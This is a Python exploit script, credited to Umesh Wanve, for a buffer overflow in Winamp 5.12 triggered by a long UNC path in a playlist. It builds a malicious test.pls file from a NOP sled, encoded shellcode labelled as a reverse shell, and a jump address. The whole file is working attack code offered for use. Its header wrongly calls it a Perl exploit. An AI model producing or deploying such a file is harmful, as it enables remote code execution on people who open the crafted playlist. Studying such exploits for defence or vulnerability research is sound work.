#!/usr/bin/python -v
# ====================================================================
# Winamp 5.12 Playlist UNC Path Computer Name Overflow Perl Exploit
# Original Poc by Umesh Wanve (umesh_345@yahoo.com)
# ==================================================================== 
start= "[playlist]\r\nFile1=\\\\";

#alpha numeric shellcode for reverse shell
nop =  "\x90"*22
nop += "\x89\xe7\xdb\xc4\xd9\x77\xf4\x5f\x57\x59\x49\x49\x49"
nop += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
nop += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
nop += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
nop += "\x58\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x5a\x48\x6d"
nop += "\x52\x77\x70\x77\x70\x33\x30\x43\x50\x4f\x79\x6a\x45"
nop += "\x64\x71\x6f\x30\x45\x34\x6e\x6b\x36\x30\x64\x70\x4c"
nop += "\x4b\x56\x32\x64\x4c\x6c\x4b\x71\x42\x74\x54\x4e\x6b"
nop += "\x33\x42\x36\x48\x64\x4f\x4e\x57\x50\x4a\x67\x56\x66"
nop += "\x51\x59\x6f\x6e\x4c\x47\x4c\x33\x51\x73\x4c\x74\x42"
nop += "\x54\x6c\x65\x70\x4a\x61\x38\x4f\x54\x4d\x75\x51\x78"
nop += "\x47\x4d\x32\x4c\x32\x71\x42\x42\x77\x6e\x6b\x76\x32"
nop += "\x32\x30\x6c\x4b\x50\x4a\x77\x4c\x4e\x6b\x62\x6c\x77"
nop += "\x61\x74\x38\x49\x73\x77\x38\x55\x51\x6b\x61\x50\x51"
nop += "\x4e\x6b\x42\x79\x51\x30\x45\x51\x49\x43\x4e\x6b\x42"
nop += "\x69\x65\x48\x58\x63\x66\x5a\x51\x59\x6c\x4b\x47\x44"
nop += "\x4c\x4b\x33\x31\x68\x56\x46\x51\x59\x6f\x4c\x6c\x6f"
nop += "\x31\x6a\x6f\x56\x6d\x37\x71\x38\x47\x65\x68\x79\x70"
nop += "\x32\x55\x68\x76\x37\x73\x61\x6d\x7a\x58\x55\x6b\x31"
nop += "\x6d\x47\x54\x34\x35\x6a\x44\x61\x48\x4e\x6b\x72\x78"
nop += "\x45\x74\x75\x51\x4e\x33\x45\x36\x6e\x6b\x74\x4c\x52"
nop += "\x6b\x4e\x6b\x42\x78\x45\x4c\x65\x51\x6e\x33\x4c\x4b"
nop += "\x36\x64\x4e\x6b\x76\x61\x7a\x70\x4d\x59\x31\x54\x61"
nop += "\x34\x55\x74\x53\x6b\x63\x6b\x70\x61\x51\x49\x43\x6a"
nop += "\x72\x71\x79\x6f\x4d\x30\x63\x6f\x71\x4f\x31\x4a\x6e"
nop += "\x6b\x56\x72\x58\x6b\x4c\x4d\x31\x4d\x62\x4a\x57\x71"
nop += "\x4e\x6d\x4f\x75\x4c\x72\x47\x70\x65\x50\x33\x30\x76"
nop += "\x30\x35\x38\x65\x61\x6e\x6b\x72\x4f\x4c\x47\x79\x6f"
nop += "\x49\x45\x6d\x6b\x78\x70\x78\x35\x59\x32\x30\x56\x43"
nop += "\x58\x6d\x76\x5a\x35\x6f\x4d\x6d\x4d\x39\x6f\x5a\x75"
nop += "\x57\x4c\x74\x46\x73\x4c\x47\x7a\x6f\x70\x69\x6b\x6b"
nop += "\x50\x62\x55\x63\x35\x6f\x4b\x70\x47\x56\x73\x51\x62"
nop += "\x42\x4f\x31\x7a\x75\x50\x56\x33\x4b\x4f\x38\x55\x32"
nop += "\x4e\x31\x75\x33\x44\x75\x70\x43\x45\x33\x43\x75\x35"
nop += "\x50\x72\x31\x30\x50\x74\x45\x35\x50\x73\x62\x54\x61"
nop += "\x30\x51\x64\x51\x75\x53\x43\x33\x44\x55\x70\x74\x6f"
nop += "\x61\x71\x63\x54\x61\x74\x45\x70\x35\x76\x66\x46\x47"
nop += "\x50\x62\x4e\x32\x45\x73\x44\x71\x30\x30\x6c\x72\x4f"
nop += "\x42\x43\x55\x31\x52\x4c\x62\x47\x31\x62\x70\x6f\x31"
nop += "\x65\x70\x70\x47\x50\x73\x51\x65\x34\x42\x4d\x55\x39"
nop += "\x52\x4e\x30\x69\x64\x33\x73\x44\x64\x32\x65\x31\x33"
nop += "\x44\x52\x4f\x53\x42\x63\x43\x55\x70\x50\x74\x73\x55"
nop += "\x44\x33\x70\x74\x51\x30\x54\x6f\x75\x31\x55\x34\x71"
nop += "\x74\x67\x70\x41\x41"


nop += "\x90"*(1022-len(nop))

shellcode =nop

#shellcode =166
#total shellcode = 1022

jmp="\xd2\xc3\x18\x1a"+"\xE9\x09\xFC\xFF\xFF\x83\x83\x83"+"\x90\x90\x90\x90" 

end="\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n" 

buffer=start+shellcode+jmp+end

mefile = open('test.pls','w');
mefile.write(buffer);
mefile.close()